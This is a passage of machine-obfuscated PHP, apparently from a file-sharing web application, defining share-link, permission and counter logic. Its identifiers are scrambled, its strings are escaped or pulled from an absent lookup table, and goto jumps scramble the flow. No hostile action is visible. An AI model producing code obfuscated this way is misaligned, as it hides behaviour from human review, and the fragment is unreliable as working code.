$a»™¨í•‰º[$dé±Ş°Ó¡[686]]; } public function set($aÍŒ¶©õ‰, $F‹×“Êôô, $EÍŒÄ‹£ã = 3600) { $dİ¨ÌÄ¿ˆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $b²÷ŒİøÓ´ = array($dİ¨ÌÄ¿ˆ[2226] => $aÍŒ¶©õ‰, $dİ¨ÌÄ¿ˆ[2139] => $F‹×“Êôô, $dİ¨ÌÄ¿ˆ[2227] => $EÍŒÄ‹£ã + time()); if (Session::get($dİ¨ÌÄ¿ˆ[2228])) { $b²÷ŒİøÓ´[$dİ¨ÌÄ¿ˆ[1437]] = Session::get($dİ¨ÌÄ¿ˆ[2228]); } else { $b²÷ŒİøÓ´[$dİ¨ÌÄ¿ˆ[1437]] = 0; } if ($this->get($aÍŒ¶©õ‰)) { return $this->where(array($dİ¨ÌÄ¿ˆ[2226] => $aÍŒ¶©õ‰))->save($b²÷ŒİøÓ´); } else { return $this->add($b²÷ŒİøÓ´, array(), !0); } } public function remove($a‰ßõŸ¿ç÷) { return $this->where(array($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][2226] => $a‰ßõŸ¿ç÷))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][2229] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\145"; protected $dataAuto = array(array("\155\157\144\151\146\171\124\x69\x6d\x65", "\164\x69\155\145", "\x69\156\x73\145\x72\164\54\x75\160\144\141\x74\145", "\146\x75\x6e\x63\164\151\x6f\x6e"), array("\143\x72\145\141\164\145\x54\151\x6d\145", "\164\x69\155\145", "\151\x6e\163\145\x72\x74", "\x66\165\x6e\x63\164\x69\157\x6e"), array("\x6f\x70\164\x69\x6f\156\x73", '', "\x69\x6e\163\145\x72\x74\x2c\x75\x70\x64\141\164\145\54\163\x65\154\x65\143\164", "\152\x73\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($DƒÉ®íç¶ğ) { $E®Ï‡¦ºÛì =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EÄÉô„«¨ˆ = isset($DƒÉ®íç¶ğ[0]) ? $DƒÉ®íç¶ğ[0] : !1; return array($E®Ï‡¦ºÛì[2230] => array(USER_ID, $E®Ï‡¦ºÛì[2231]), $E®Ï‡¦ºÛì[2179] => array($EÄÉô„«¨ˆ, $E®Ï‡¦ºÛì[2232])); } protected function listSimple() { $aÇ¹ŞæÃ•Æ = array($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1437] => USER_ID); $A×ˆÃ˜„¼¸ = $this->field($this->fieldList)->where($aÇ¹ŞæÃ•Æ)->select(); return $A×ˆÃ˜„¼¸ ? $A×ˆÃ˜„¼¸ : array(); } protected function getInfo($f³÷‰Öˆ¾ˆ, $aæôİî†©“ = false) { $D£«éãã™» =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($aæôİî†©“) { return $this->_getShareInfo(array($D£«éãã™»[441] => $f³÷‰Öˆ¾ˆ)); } $A¸ËîŒŠˆ‹ = $this->cacheFunctionGet($D£«éãã™»[2233], $f³÷‰Öˆ¾ˆ); return $A¸ËîŒŠˆ‹; } public function getInfoByHash($eŒ“ß¥­Å¿) { return $this->_getShareInfo(array($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][443] => $eŒ“ß¥­Å¿)); } public function getInfoByPath($DäÊ¬ÎÍŒ) { $eÜµùìé„Ã =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d«¦¸ƒÚğÎ = array($eÜµùìé„Ã[1437] => USER_ID, $eÜµùìé„Ã[369] => $DäÊ¬ÎÍŒ); return $this->_getShareInfo($d«¦¸ƒÚğÎ); } public function getInfoBySourcePath($D…Œ¾Ø¨¯¿) { $C¢‚¯ŞƒÙ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f¸Œ÷²ÀëŒ = array($C¢‚¯ŞƒÙ[1437] => USER_ID, $C¢‚¯ŞƒÙ[1016] => $D…Œ¾Ø¨¯¿); return $this->_getShareInfo($f¸Œ÷²ÀëŒ); } private function _getShareInfo($Câ·âóšº¤) { goto bï¾œ¡”Í‚; bï¾œ¡”Í‚: $d ¦ĞğÅã =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eÔØõÂ†® = $this->where($Câ·âóšº¤)->find(); if (!$eÔØõÂ†®) { return !1; } goto f£¿—†±‹Ë; dîšÜÊİ½ƒ: if ($eÔØõÂ†®[$d ¦ĞğÅã[369]] == $d ¦ĞğÅã[470]) { $eÔØõÂ†®[$d ¦ĞğÅã[391]] = IO::info($eÔØõÂ†®[$d ¦ĞğÅã[1016]]); } else { $eÔØõÂ†®[$d ¦ĞğÅã[391]] = Model($d ¦ĞğÅã[1114])->pathInfo($eÔØõÂ†®[$d ¦ĞğÅã[369]]); } $eÔØõÂ†®[$d ¦ĞğÅã[2235]] = $BåÏ—†³Úà; return $eÔØõÂ†®; goto a©ö„¦¹ÜŠ; f£¿—†±‹Ë: $Câ·âóšº¤ = array($d ¦ĞğÅã[441] => $eÔØõÂ†®[$d ¦ĞğÅã[441]]); $fùÉè¥éÚ• = $d ¦ĞğÅã[2234]; $BåÏ—†³Úà = Model($d ¦ĞğÅã[539])->order($d ¦ĞğÅã[367])->field($fùÉè¥éÚ•)->where($Câ·âóšº¤)->select(); goto dîšÜÊİ½ƒ; a©ö„¦¹ÜŠ: } protected function getInfoAuth($c‘†ˆ†›¨‚) { $f¡Íã¨‡ƒÑ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $AïÅõè»Ï = $this->getInfo($c‘†ˆ†›¨‚); $AïÅõè»Ï[$f¡Íã¨‡ƒÑ[376]] = Model($f¡Íã¨‡ƒÑ[456])->authMake($AïÅõè»Ï[$f¡Íã¨‡ƒÑ[2235]]); return $AïÅõè»Ï; } protected function listData($E±‚•ªÎ„‚ = null, $eö¼Œ‚Ç™ = 300) { $C—£½ÄŠ÷‚ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $E¬ªŒ÷‰øÍ = array(array($C—£½ÄŠ÷‚[446] => array($C—£½ÄŠ÷‚[922], 0), $C—£½ÄŠ÷‚[448] => array($C—£½ÄŠ÷‚[922], 0), $C—£½ÄŠ÷‚[2236] => $C—£½ÄŠ÷‚[2193])); if ($E±‚•ªÎ„‚ == $C—£½ÄŠ÷‚[1874]) { $E¬ªŒ÷‰øÍ = array($C—£½ÄŠ÷‚[446] => 1); } else { if ($E±‚•ªÎ„‚ == $C—£½ÄŠ÷‚[1005]) { $E¬ªŒ÷‰øÍ = array($C—£½ÄŠ÷‚[448] => 1); } } $E¬ªŒ÷‰øÍ[$C—£½ÄŠ÷‚[1437]] = USER_ID; $b¼•è›ò• = $this->where($E¬ªŒ÷‰øÍ)->selectPage($eö¼Œ‚Ç™); return $b¼•è›ò•; } protected function listToMe($AªÙˆƒ¯Ô = 300) { goto eÂÈÏ¥Å‘‘; aÜ™½å—„ó: $d¤¯ÀŠçÔŠ = array($f¤Ÿ†›§¸[2239] => $d±ìº†±’, $f¤Ÿ†›§¸[2240] => $b£ÔÌ’é[$f¤Ÿ†›§¸[351]]); return $d¤¯ÀŠçÔŠ; goto f¶Ïˆà‹Ğ; eÂÈÏ¥Å‘‘: $f¤Ÿ†›§¸ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e’´ê‰¿† = Model($f¤Ÿ†›§¸[2237])->userGroupParents(USER_ID); $Dî‰Ï¦ñÈŒ = array($f¤Ÿ†›§¸[523] => SourceModel::TYPE_USER, $f¤Ÿ†›§¸[458] => USER_ID); goto A¥ŒÅÚÍ’§; b¤«‡ù©Çİ: $d±ìº†±’ = $this->field($eª²¼¤Â°Ë)->where($Dî‰Ï¦ñÈŒ)->select(); foreach ($d±ìº†±’ as $dßßÂ…†Ğ => &$c°µƒÔ¬İ) { $c°µƒÔ¬İ[$f¤Ÿ†›§¸[2235]] = $B™ãÀ¢†˜[$c°µƒÔ¬İ[$f¤Ÿ†›§¸[441]]]; } unset($c°µƒÔ¬İ); goto aÜ™½å—„ó; A¥ŒÅÚÍ’§: if ($e’´ê‰¿†) { $Dî‰Ï¦ñÈŒ = array(array($f¤Ÿ†›§¸[523] => SourceModel::TYPE_USER, $f¤Ÿ†›§¸[458] => USER_ID), array($f¤Ÿ†›§¸[523] => SourceModel::TYPE_GROUP, $f¤Ÿ†›§¸[458] => array($f¤Ÿ†›§¸[7], $e’´ê‰¿†)), $f¤Ÿ†›§¸[2236] => $f¤Ÿ†›§¸[2193]); } $b£ÔÌ’é = Model($f¤Ÿ†›§¸[539])->where($Dî‰Ï¦ñÈŒ)->selectPage($AªÙˆƒ¯Ô); $B™ãÀ¢†˜ = array_to_keyvalue_group($b£ÔÌ’é[$f¤Ÿ†›§¸[354]], $f¤Ÿ†›§¸[441]); goto bœÉË¸ÂÇ¤; bœÉË¸ÂÇ¤: if (!$B™ãÀ¢†˜) { return $b£ÔÌ’é; } $eª²¼¤Â°Ë = $f¤Ÿ†›§¸[2238]; $Dî‰Ï¦ñÈŒ = array($f¤Ÿ†›§¸[441] => array($f¤Ÿ†›§¸[384], array_keys($B™ãÀ¢†˜))); goto b¤«‡ù©Çİ; f¶Ïˆà‹Ğ: } protected function shareAdd($fÓÙ…ÁåÀ, $c« ®ŒµòÚ) { $Bß§ƒôŞ¥ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Bø›¯ö‹î› = $this->_addShareData($fÓÙ…ÁåÀ, $c« ®ŒµòÚ); if (!empty($c« ®ŒµòÚ[$Bß§ƒôŞ¥[2241]])) { $this->_shareAuthSet($Bø›¯ö‹î›, $c« ®ŒµòÚ[$Bß§ƒôŞ¥[2241]]); } $this->shareEventAdd($fÓÙ…ÁåÀ, $c« ®ŒµòÚ, $Bß§ƒôŞ¥[1008]); return $Bø›¯ö‹î›; } private function shareEventAdd($F‡Ò”¦“ëï, $e±•òšÏ¢è, $EßŒªœ·ø® = "\x61\x64\144") { goto cø«§Í‡­Ó; BõÉÁØõğ‡: return; goto cĞ…ô’·—…; cø«§Í‡­Ó: $bš³åÑ²› =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($EßŒªœ·ø® == $bš³åÑ²›[1008]) { if ($e±•òšÏ¢è[$bš³åÑ²›[446]] == $bš³åÑ²›[83]) { Model($bš³åÑ²›[507])->eventShare($F‡Ò”¦“ëï, $bš³åÑ²›[2242]); } if ($e±•òšÏ¢è[$bš³åÑ²›[448]] == $bš³åÑ²›[83]) { Model($bš³åÑ²›[507])->eventShare($F‡Ò”¦“ëï, $bš³åÑ²›[2243]); } return; } $bÍº¥ÃçÎ = $this->getInfoByPath($F‡Ò”¦“ëï); goto eä‡­Äø”²; E íØÚÔ¨: if ($bÍº¥ÃçÎ[$bš³åÑ²›[448]] == $bš³åÑ²›[470] && $e±•òšÏ¢è[$bš³åÑ²›[448]] == $bš³åÑ²›[83]) { $e†ØÒŞ†­ = $bš³åÑ²›[2243]; } if ($bÍº¥ÃçÎ[$bš³åÑ²›[448]] == $bš³åÑ²›[83] && $e±•òšÏ¢è[$bš³åÑ²›[448]] == $bš³åÑ²›[470]) { $e†ØÒŞ†­ = $bš³åÑ²›[2246]; } Model($bš³åÑ²›[507])->eventShare($F‡Ò”¦“ëï, $e†ØÒŞ†­); goto BõÉÁØõğ‡; eä‡­Äø”²: $e†ØÒŞ†­ = $bš³åÑ²›[2244]; if ($bÍº¥ÃçÎ[$bš³åÑ²›[446]] == $bš³åÑ²›[470] && $e±•òšÏ¢è[$bš³åÑ²›[446]] == $bš³åÑ²›[83]) { $e†ØÒŞ†­ = $bš³åÑ²›[2242]; } if ($bÍº¥ÃçÎ[$bš³åÑ²›[446]] == $bš³åÑ²›[83] && $e±•òšÏ¢è[$bš³åÑ²›[446]] == $bš³åÑ²›[470]) { $e†ØÒŞ†­ = $bš³åÑ²›[2245]; } goto E íØÚÔ¨; cĞ…ô’·—…: } private function _addShareData($d¥Â‹ôãòõ, $EÒÛ¼Ÿ±ø = array()) { goto e”ËñÆÁ™; cÁæÎ·…áğ: $fù·È°²š  = array($F£¨¦ø…†[1428] => USER_ID, $F£¨¦ø…†[383] => $d¥Â‹ôãòõ, $F£¨¦ø…†[1343] => $F£¨¦ø…†[33], $F£¨¦ø…†[446] => 0, $F£¨¦ø…†[448] => 0, $F£¨¦ø…†[1016] => $F£¨¦ø…†[33], $F£¨¦ø…†[295] => $F£¨¦ø…†[33], $F£¨¦ø…†[798] => $F£¨¦ø…†[33], $F£¨¦ø…†[2248] => 0, $F£¨¦ø…†[2249] => 0, $F£¨¦ø…†[449] => 0, $F£¨¦ø…†[450] => $F£¨¦ø…†[33], $F£¨¦ø…†[443] => $F£¨¦ø…†[33]); $fÛÜ±ë„ã± = explode($F£¨¦ø…†[47], $F£¨¦ø…†[2250]); foreach ($fÛÜ±ë„ã± as $fˆ¾Ü° ÀŞ) { if (!isset($EÒÛ¼Ÿ±ø[$fˆ¾Ü° ÀŞ])) { continue; } $fù·È°²š [$fˆ¾Ü° ÀŞ] = $EÒÛ¼Ÿ±ø[$fˆ¾Ü° ÀŞ]; } goto A„ºĞèê¹‚; E„½£µ¤‡Ø: if ($Bğï»¾Ù†» = $this->where($c‡¯•÷¸‰)->find()) { return $Bğï»¾Ù†»[$F£¨¦ø…†[441]]; } if ($d¥Â‹ôãòõ == 0) { $c¯î¹¦¼ = array($F£¨¦ø…†[28] => get_path_this($EÒÛ¼Ÿ±ø[$F£¨¦ø…†[75]])); } else { $c¯î¹¦¼ = Model($F£¨¦ø…†[754])->sourceInfo($d¥Â‹ôãòõ); if (!$c¯î¹¦¼) { return !1; } } if (!$EÒÛ¼Ÿ±ø[$F£¨¦ø…†[1343]]) { $EÒÛ¼Ÿ±ø[$F£¨¦ø…†[1343]] = $c¯î¹¦¼[$F£¨¦ø…†[28]]; } goto cÁæÎ·…áğ; c¤ä·Œà›ó: return $fÅÓÌºíÛ; goto Fòìô²¦ÅÄ; A„ºĞèê¹‚: $fÅÓÌºíÛ = $this->add($fù·È°²š ); $Eğì±ÀÈ·Ú = array($F£¨¦ø…†[443] => short_id($fÅÓÌºíÛ)); $this->where(array($F£¨¦ø…†[440] => $fÅÓÌºíÛ))->save($Eğì±ÀÈ·Ú); goto c¤ä·Œà›ó; e”ËñÆÁ™: $F£¨¦ø…† =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c‡¯•÷¸‰ = array($F£¨¦ø…†[383] => $d¥Â‹ôãòõ, $F£¨¦ø…†[1428] => USER_ID); if ($d¥Â‹ôãòõ == 0) { $c‡¯•÷¸‰ = array($F£¨¦ø…†[2247] => $EÒÛ¼Ÿ±ø[$F£¨¦ø…†[1016]], $F£¨¦ø…†[1428] => USER_ID); } goto E„½£µ¤‡Ø; Fòìô²¦ÅÄ: } private function _shareAuthSet($D›¤âİô‘Â, $b›¹ÖÓ¡‚Û) { goto E„´İÖ³°; E¥ÔŞ‡ï“Ô: $CÄ¦ÏŞöù->where(array($bŒ»èÕšÊ[441] => $D›¤âİô‘Â))->delete(); $AçÉ‰„¸ë = array(); foreach ($b›¹ÖÓ¡‚Û as $fß°¾â´‹) { $dÚ¼ Í‡Á = SourceModel::TYPE_USER; if ($fß°¾â´‹[$bŒ»èÕšÊ[371]] == SourceModel::TYPE_GROUP) { $dÚ¼ Í‡Á = SourceModel::TYPE_GROUP; } $aí¤é² ½Ì = array($bŒ»èÕšÊ[441] => $D›¤âİô‘Â, $bŒ»èÕšÊ[371] => $dÚ¼ Í‡Á, $bŒ»èÕšÊ[458] => intval($fß°¾â´‹[$bŒ»èÕšÊ[458]]), $bŒ»èÕšÊ[2252] => 0, $bŒ»èÕšÊ[2253] => -1); if ($fß°¾â´‹[$bŒ»èÕšÊ[2252]]) { $aí¤é² ½Ì[$bŒ»èÕšÊ[2252]] = $fß°¾â´‹[$bŒ»èÕšÊ[2252]]; } else { if ($fß°¾â´‹[$bŒ»èÕšÊ[2253]]) { $aí¤é² ½Ì[$bŒ»èÕšÊ[2253]] = $fß°¾â´‹[$bŒ»èÕšÊ[2253]]; } } $AçÉ‰„¸ë[] = $aí¤é² ½Ì; } goto DõõÈ¾Ø£ã; E„´İÖ³°: $bŒ»èÕšÊ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!is_array($b›¹ÖÓ¡‚Û)) { return !1; } $CÄ¦ÏŞöù = Model($bŒ»èÕšÊ[2251]); goto E¥ÔŞ‡ï“Ô; DõõÈ¾Ø£ã: return $CÄ¦ÏŞöù->addAll($AçÉ‰„¸ë, array(), !0); goto C”…Ê–‹ìŞ; C”…Ê–‹ìŞ: } public function numViewAdd($eš¸Ì¹™óÉ) { $fÔØáù‹– =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Càò‹›ô– = array($fÔØáù‹–[440] => $eš¸Ì¹™óÉ); $this->where($Càò‹›ô–)->setAdd($fÔØáù‹–[2248]); } public function numDownloadAdd($e®¢›Å‰·ˆ) { $a‰¡è‹õæ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fÁù§…ÃšÖ = array($a‰¡è‹õæ[440] => $e®¢›Å‰·ˆ); $this->where($fÁù§…ÃšÖ)->setAdd($a‰¡è‹õæ[2249]); } protected function shareEdit($b³Œ‘¡‰Õƒ, $fÊ®¢êÌ«ê) { goto f ©†èÚ¯œ; f ©†èÚ¯œ: $DÌè˜ç˜¨ƒ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Eó¯õğ‘Éİ = $this->getInfo($b³Œ‘¡‰Õƒ); if (!$Eó¯õğ‘Éİ) { return !1; } goto cŞóæ”çˆó; c‘¬ñä‘Ë´: foreach ($d¢…Ó‰¹Ş as $Aá«¬¬öÖ§) { if (!array_key_exists($Aá«¬¬öÖ§, $fÊ®¢êÌ«ê)) { continue; } $F„Ã³ÙË¨Æ[$Aá«¬¬öÖ§] = $fÊ®¢êÌ«ê[$Aá«¬¬öÖ§]; } $this->shareEventAdd($Eó¯õğ‘Éİ[$DÌè˜ç˜¨ƒ[369]], $fÊ®¢êÌ«ê, $DÌè˜ç˜¨ƒ[2075]); $this->where(array($DÌè˜ç˜¨ƒ[440] => $b³Œ‘¡‰Õƒ))->save($F„Ã³ÙË¨Æ); goto CÅ‰ö‰šò‰; cŞóæ”çˆó: $this->_checkLinkShare($fÊ®¢êÌ«ê, $Eó¯õğ‘Éİ); $F„Ã³ÙË¨Æ = array(); $d¢…Ó‰¹Ş = explode($DÌè˜ç˜¨ƒ[47], $DÌè˜ç˜¨ƒ[2254]); goto c‘¬ñä‘Ë´; CÅ‰ö‰šò‰: if (isset($fÊ®¢êÌ«ê[$DÌè˜ç˜¨ƒ[2241]])) { $this->_shareAuthSet($b³Œ‘¡‰Õƒ, $fÊ®¢êÌ«ê[$DÌè˜ç˜¨ƒ[2241]]); } return !0; goto EÆÖ¬İ‡Û½; EÆÖ¬İ‡Û½: } private function _checkLinkShare($a¥‹ÕöôÔ‰, $fõ³×äÒ) { goto d…‚ß°‘ß¸; dë§æ·³í’: $FÉ¤Ğº¯àù = $this->shareFileMeta($AáÆ´‹¨[$E³÷³¤Ş›é[419]]); if (isset($FÉ¤Ğº¯àù[$E³÷³¤Ş›é[359]]) && $FÉ¤Ğº¯àù[$E³÷³¤Ş›é[359]] == $E³÷³¤Ş›é[83]) { show_json(LNG($E³÷³¤Ş›é[2257]), !1); } goto c¥¿ƒ¢Ñ…®; d…‚ß°‘ß¸: $E³÷³¤Ş›é =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($a¥‹ÕöôÔ‰[$E³÷³¤Ş›é[446]] != $E³÷³¤Ş›é[83]) { return; } $f…ŠŞë˜§¿ = $fõ³×äÒ[$E³÷³¤Ş›é[391]][$E³÷³¤Ş›é[369]]; goto b„„Ù»¼À; b„„Ù»¼À: if ($fõ³×äÒ[$E³÷³¤Ş›é[391]][$E³÷³¤Ş›é[29]] != $E³÷³¤Ş›é[167]) { $B”½‡¤ƒˆÔ = $this->_folderReport($f…ŠŞë˜§¿); if (!$B”½‡¤ƒˆÔ) { return; } show_json(LNG($E³÷³¤Ş›é[2255]) . $E³÷³¤Ş›é[2256] . $B”½‡¤ƒˆÔ, !1); } $AáÆ´‹¨ = Model($E³÷³¤Ş›é[754])->fileInfoGet($fõ³×äÒ[$E³÷³¤Ş›é[391]][$E³÷³¤Ş›é[369]]); if (!$AáÆ´‹¨) { return; } goto dë§æ·³í’; c¥¿ƒ¢Ñ…®: } private function _folderReport($cø…ÇÉÁ±½) { goto FÉÌ‚³ÔÂ¶; a†Â¤œï†Ğ: $b•±ã…âù¯ = array($CÉìÛàñëÉ[419] => array($CÉìÛàñëÉ[7], $DàÃ×õŞ), $CÉìÛàñëÉ[461] => array($CÉìÛàñëÉ[753], "\x25{$aß¾ÈÇ†µ–}\x25"), $CÉìÛàñëÉ[397] => 0); $C‹Š‹ù—”Ö = Model($CÉìÛàñëÉ[754])->where($b•±ã…âù¯)->field($CÉìÛàñëÉ[2259])->find(); if (!$C‹Š‹ù—”Ö) { return !1; } goto D†ó‚Š£¦Æ; FÉÌ‚³ÔÂ¶: $CÉìÛàñëÉ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $b•±ã…âù¯ = array($CÉìÛàñëÉ[419] => array($CÉìÛàñëÉ[922], 0), $CÉìÛàñëÉ[683] => 3); $DàÃ×õŞ = Model($CÉìÛàñëÉ[2258])->where($b•±ã…âù¯)->field($CÉìÛàñëÉ[419])->select(); goto EÙ©‹Àóåî; EÙ©‹Àóåî: if (!$DàÃ×õŞ) { return !1; } $DàÃ×õŞ = array_to_keyvalue($DàÃ×õŞ, $CÉìÛàñëÉ[33], $CÉìÛàñëÉ[419]); $aß¾ÈÇ†µ– = $CÉìÛàñëÉ[47] . $cø…ÇÉÁ±½ . $CÉìÛàñëÉ[47]; goto a†Â¤œï†Ğ; D†ó‚Š£¦Æ: $fóæµ„½ = substr($C‹Š‹ù—”Ö[$CÉìÛàñëÉ[461]], strpos($C‹Š‹ù—”Ö[$CÉìÛàñëÉ[461]], $aß¾ÈÇ†µ–)); $b•±ã…âù¯ = array($CÉìÛàñëÉ[369] => array($CÉìÛàñëÉ[7], trim($fóæµ„½, $CÉìÛàñëÉ[47]))); $EŠÓ„ÈÃ‡Ç = Model($CÉìÛàñëÉ[754])->where($b•±ã…âù¯)->field($CÉìÛàñëÉ[28])->select(); goto Eİ³µÁç´‚; Eİ³µÁç´‚: $cŠ´¨ó¡âÆ = array_to_keyvalue($EŠÓ„ÈÃ‡Ç, $CÉìÛàñëÉ[33], $CÉìÛàñëÉ[28]); $cŠ´¨ó¡âÆ[] = $C‹Š‹ù—”Ö[$CÉìÛàñëÉ[28]]; return implode($CÉìÛàñëÉ[8], $cŠ´¨ó¡âÆ); goto bÆºòâË–Š; bÆºòâË–Š: } protected function remove($a‡Æ©èÊ‹») { goto C´¯†‡¢‹’; A‘Ó‰ºŠ‚Ñ: for ($BÓ†“¼©×Ü = 0; $BÓ†“¼©×Ü < count($aî›ìÅ¬•„); $BÓ†“¼©×Ü++) { $dò¦İÊ•Ü˜ = $this->getInfo($aî›ìÅ¬•„[$BÓ†“¼©×Ü]); if ($dò¦İÊ•Ü˜[$eŸîİ¼ƒÇÌ[448]] == $eŸîİ¼ƒÇÌ[83]) { Model($eŸîİ¼ƒÇÌ[507])->eventShare($dò¦İÊ•Ü˜[$eŸîİ¼ƒÇÌ[369]], $eŸîİ¼ƒÇÌ[2246]); } if ($dò¦İÊ•Ü˜[$eŸîİ¼ƒÇÌ[446]] == $eŸîİ¼ƒÇÌ[83]) { Model($eŸîİ¼ƒÇÌ[507])->eventShare($dò¦İÊ•Ü˜[$eŸîİ¼ƒÇÌ[369]], $eŸîİ¼ƒÇÌ[2245]); } } return $FÚªõğäº´; goto cœÙª¿Â°Ñ; C´¯†‡¢‹’: $eŸîİ¼ƒÇÌ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (is_array($a‡Æ©èÊ‹»)) { $a‡Æ©èÊ‹» = array($eŸîİ¼ƒÇÌ[7], $a‡Æ©èÊ‹»); } $aèÇ™‘òº­ = array($eŸîİ¼ƒÇÌ[441] => $a‡Æ©èÊ‹»); goto c½ò‚×ÛÙ; c½ò‚×ÛÙ: $FÚªõğäº´ = $this->where($aèÇ™‘òº­)->delete(); if ($FÚªõğäº´) { Model($eŸîİ¼ƒÇÌ[539])->where(array($eŸîİ¼ƒÇÌ[441] => $a‡Æ©èÊ‹»))->delete(); } $aî›ìÅ¬•„ = is_array($a‡Æ©èÊ‹») ? $a‡Æ©èÊ‹»[1] : array($a‡Æ©èÊ‹»); goto A‘Ó‰ºŠ‚Ñ; cœÙª¿Â°Ñ: } protected function removeBySource($cÄ¡¿·¤±ø) { goto eªÏ¸¿ØÌä; EÉ‡ŒëÍ³™: $bµ­ÎÅŸÙ° = array_to_keyvalue($bµ­ÎÅŸÙ°, $Fµ˜Í¦¥Ş¶[33], $Fµ˜Í¦¥Ş¶[441]); if (!$bµ­ÎÅŸÙ°) { return; } $AÀİ£òÑ©Ê = array($Fµ˜Í¦¥Ş¶[440] => array($Fµ˜Í¦¥Ş¶[384], $bµ­ÎÅŸÙ°)); goto dÌ’ªÜßÍ; dÌ’ªÜßÍ: $this->where($AÀİ£òÑ©Ê)->delete(); Model($Fµ˜Í¦¥Ş¶[539])->where($AÀİ£òÑ©Ê)->delete(); goto F…Úä¨‹Ä; eªÏ¸¿ØÌä: $Fµ˜Í¦¥Ş¶ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $AÀİ£òÑ©Ê = array($Fµ˜Í¦¥Ş¶[383] => array($Fµ˜Í¦¥Ş¶[384], $cÄ¡¿·¤±ø)); $bµ­ÎÅŸÙ° = $this->field($Fµ˜Í¦¥Ş¶[441])->where($AÀİ£òÑ©Ê)->select(); goto EÉ‡ŒëÍ³™; F…Úä¨‹Ä: } public function listAll($d·Ï«íËÉ”) { goto B‚ô¢®³¸ç; B‚ô¢®³¸ç: $eäóÕ« =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $F÷„ñÜƒ–ã = array(); if ($d·Ï«íËÉ”[$eäóÕ«[1437]]) { $F÷„ñÜƒ–ã[$eäóÕ«[1437]] = $d·Ï«íËÉ”[$eäóÕ«[1437]]; } goto bÖÆÃˆ…­; F·Ğ†Á÷¦Ç: return $d×¢ù·‰¶¤; goto FİÀ¬ºğÇƒ; bÖÆÃˆ…­: if ($d·Ï«íËÉ”[$eäóÕ«[696]]) { $aÔ±Ğ‡† = $d·Ï«íËÉ”[$eäóÕ«[449]] ? $d·Ï«íËÉ”[$eäóÕ«[449]] : strtotime(date($eäóÕ«[2260])); $F÷„ñÜƒ–ã[$eäóÕ«[187]] = array($eäóÕ«[321], array($d·Ï«íËÉ”[$eäóÕ«[696]], $aÔ±Ğ‡†)); } if ($d·Ï«íËÉ”[$eäóÕ«[29]]) { $F÷„ñÜƒ–ã[$d·Ï«íËÉ”[$eäóÕ«[29]]] = 1; } else { $F÷„ñÜƒ–ã[] = array($eäóÕ«[446] => array($eäóÕ«[922], 0), $eäóÕ«[448] => array($eäóÕ«[922], 0), $eäóÕ«[2236] => $eäóÕ«[2193]); } if ($d·Ï«íËÉ”[$eäóÕ«[2189]]) { $F÷„ñÜƒ–ã[] = array($eäóÕ«[443] => $d·Ï«íËÉ”[$eäóÕ«[2189]], $eäóÕ«[1343] => array($eäóÕ«[753], "\45{$d·Ï«íËÉ”[$eäóÕ«[2189]]}\45"), $eäóÕ«[2236] => $eäóÕ«[2193]); } goto F½¢Ë£ÕñÄ; F½¢Ë£ÕñÄ: $d×¢ù·‰¶¤ = $this->_makeOrder()->where($F÷„ñÜƒ–ã)->selectPage(20); if (empty($d×¢ù·‰¶¤[$eäóÕ«[354]])) { return array(); } $this->_listDataApply($d×¢ù·‰¶¤[$eäóÕ«[354]]); goto F·Ğ†Á÷¦Ç; FİÀ¬ºğÇƒ: } public function listDataApply($fÔŞŞŒÁ£±) { $this->_listDataApply($fÔŞŞŒÁ£±); return $fÔŞŞŒÁ£±; } private function _listDataApply(&$dôÛ «Íæ£) { goto eÃÎÓà‡Ù; eÃÎÓà‡Ù: $D“š¿—ÃöÖ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CğôÁß²öÊ = array_to_keyvalue($dôÛ «Íæ£, $D“š¿—ÃöÖ[33], $D“š¿—ÃöÖ[1437]); $D©’Û–¸·é = Model($D“š¿—ÃöÖ[479])->userListInfo(array_unique($CğôÁß²öÊ)); goto DË³§íæÅª; f›’ëöÏ¯í: unset($d©‚òÇ À¤); goto EÏÂ‡ÑªÅô; DË³§íæÅª: $aÓÓ”º¢Ç = array_to_keyvalue($dôÛ «Íæ£, $D“š¿—ÃöÖ[33], $D“š¿—ÃöÖ[369]); $cÄó„¥×œ = Model($D“š¿—ÃöÖ[754])->sourceListInfo($aÓÓ”º¢Ç, !0); foreach ($dôÛ «Íæ£ as &$d©‚òÇ À¤) { $b¿¯ÁîŒ… = $d©‚òÇ À¤[$D“š¿—ÃöÖ[1437]]; $d©‚òÇ À¤[$D“š¿—ÃöÖ[2261]] = $D©’Û–¸·é[$b¿¯ÁîŒ…] ? $D©’Û–¸·é[$b¿¯ÁîŒ…] : !1; $f²‡Ûì±Ü = $d©‚òÇ À¤[$D“š¿—ÃöÖ[369]]; $d©‚òÇ À¤[$D“š¿—ÃöÖ[391]] = $cÄó„¥×œ[$f²‡Ûì±Ü] ? $cÄó„¥×œ[$f²‡Ûì±Ü] : !1; } goto 